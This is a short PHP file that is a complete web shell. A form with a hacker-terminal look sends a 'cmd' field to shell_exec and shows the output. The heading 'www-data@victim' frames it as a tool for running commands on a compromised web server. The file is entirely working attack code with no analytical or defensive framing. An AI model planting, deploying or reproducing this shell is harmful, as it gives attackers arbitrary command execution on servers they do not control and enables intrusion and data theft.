<?php
if(isset($_POST['cmd'])) {
    echo "<pre>".shell_exec($_POST['cmd'])."</pre>";
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Terminal</title>
  <style>
    body {
      background-color: #121212;
      color: #00ff88;
      font-family: monospace;
      padding: 20px;
    }
    input, button {
      background-color: #1e1e1e;
      color: #00ff88;
      border: 1px solid #00ff88;
      padding: 5px 10px;
      font-family: monospace;
    }
    textarea {
      width: 100%;
      height: 300px;
      background-color: #1e1e1e;
      color: #00ff88;
      border: 1px solid #00ff88;
      padding: 10px;
    }
  </style>
</head>
<body>
  <h2>~ www-data@victim:~$</h2>
  <form method="POST">
    <input type="text" name="cmd" autofocus autocomplete="off" placeholder="whoami">
    <button type="submit">Execute</button>
  </form>

  <?php if(isset($_POST['cmd'])): ?>
    <h3>Output:</h3>
    <textarea readonly><?php echo htmlspecialchars(shell_exec($_POST['cmd'])); ?></textarea>
  <?php endif; ?>
</body>
</html>

